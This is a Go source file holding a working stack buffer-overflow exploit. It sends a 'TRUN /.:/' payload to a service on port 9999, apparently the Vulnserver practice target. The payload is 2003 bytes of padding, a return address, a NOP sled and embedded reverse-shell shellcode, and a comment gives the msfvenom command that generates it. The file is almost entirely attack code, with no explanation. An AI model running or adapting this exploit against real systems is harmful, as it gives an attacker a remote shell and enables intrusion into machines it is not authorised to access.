package main

import (
	"fmt"
	"net"
	"strings"
)

func main() {
	//run:
	//msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR IP> LPORT=<A PORT> EXITFUNC=thread -f c -a x86 -b "\x00

	//Past it here like this:
	overflow := ("\xb8\xe9\xca\xc9\x04\xd9\xe1\xd9\x74\x24\xf4\x5b\x33\xc9\xb1" +
		"\x52\x31\x43\x12\x03\x43\x12\x83\x2a\xce\x2b\xf1\x50\x27\x29" +
		"\xfa\xa8\xb8\x4e\x72\x4d\x89\x4e\xe0\x06\xba\x7e\x62\x4a\x37" +
		"\xf4\x26\x7e\xcc\x78\xef\x71\x65\x36\xc9\xbc\x76\x6b\x29\xdf" +
		"\xf4\x76\x7e\x3f\xc4\xb8\x73\x3e\x01\xa4\x7e\x12\xda\xa2\x2d" +
		"\x82\x6f\xfe\xed\x29\x23\xee\x75\xce\xf4\x11\x57\x41\x8e\x4b" +
		"\x77\x60\x43\xe0\x3e\x7a\x80\xcd\x89\xf1\x72\xb9\x0b\xd3\x4a" +
		"\x42\xa7\x1a\x63\xb1\xb9\x5b\x44\x2a\xcc\x95\xb6\xd7\xd7\x62" +
		"\xc4\x03\x5d\x70\x6e\xc7\xc5\x5c\x8e\x04\x93\x17\x9c\xe1\xd7" +
		"\x7f\x81\xf4\x34\xf4\xbd\x7d\xbb\xda\x37\xc5\x98\xfe\x1c\x9d" +
		"\x81\xa7\xf8\x70\xbd\xb7\xa2\x2d\x1b\xbc\x4f\x39\x16\x9f\x07" +
		"\x8e\x1b\x1f\xd8\x98\x2c\x6c\xea\x07\x87\xfa\x46\xcf\x01\xfd" +
		"\xa9\xfa\xf6\x91\x57\x05\x07\xb8\x93\x51\x57\xd2\x32\xda\x3c" +
		"\x22\xba\x0f\x92\x72\x14\xe0\x53\x22\xd4\x50\x3c\x28\xdb\x8f" +
		"\x5c\x53\x31\xb8\xf7\xae\xd2\x07\xaf\xb3\x4b\xe0\xb2\xb3\x8e" +
		"\xc9\x3b\x55\xfa\x39\x6a\xce\x93\xa0\x37\x84\x02\x2c\xe2\xe1" +
		"\x05\xa6\x01\x16\xcb\x4f\x6f\x04\xbc\xbf\x3a\x76\x6b\xbf\x90" +
		"\x1e\xf7\x52\x7f\xde\x7e\x4f\x28\x89\xd7\xa1\x21\x5f\xca\x98" +
		"\x9b\x7d\x17\x7c\xe3\xc5\xcc\xbd\xea\xc4\x81\xfa\xc8\xd6\x5f" +
		"\x02\x55\x82\x0f\x55\x03\x7c\xf6\x0f\xe5\xd6\xa0\xfc\xaf\xbe" +
		"\x35\xcf\x6f\xb8\x39\x1a\x06\x24\x8b\xf3\x5f\x5b\x24\x94\x57" +
		"\x24\x58\x04\x97\xff\xd8\x24\x7a\xd5\x14\xcd\x23\xbc\x94\x90" +
		"\xd3\x6b\xda\xac\x57\x99\xa3\x4a\x47\xe8\xa6\x17\xcf\x01\xdb" +
		"\x08\xba\x25\x48\x28\xef")

	server := "<winIP>:9999"
	conn, err := net.Dial("tcp", server)
	handleErr(err)

	shellcode := strings.Repeat("A", 2003) + "\xaf\x11\x50\x62" + strings.Repeat("\x90", 32) + overflow

	for {
		payload := "TRUN /.:/" + shellcode

		_, err := conn.Write([]byte(payload))
		handleErr(err)

		reply := make([]byte, 1024)
		conn.Read(reply)
		fmt.Println(string(reply))
		fmt.Printf("%d\n", len(shellcode))
	}
}

func handleErr(err error) {
	if err != nil {
		panic(err)
	}
}
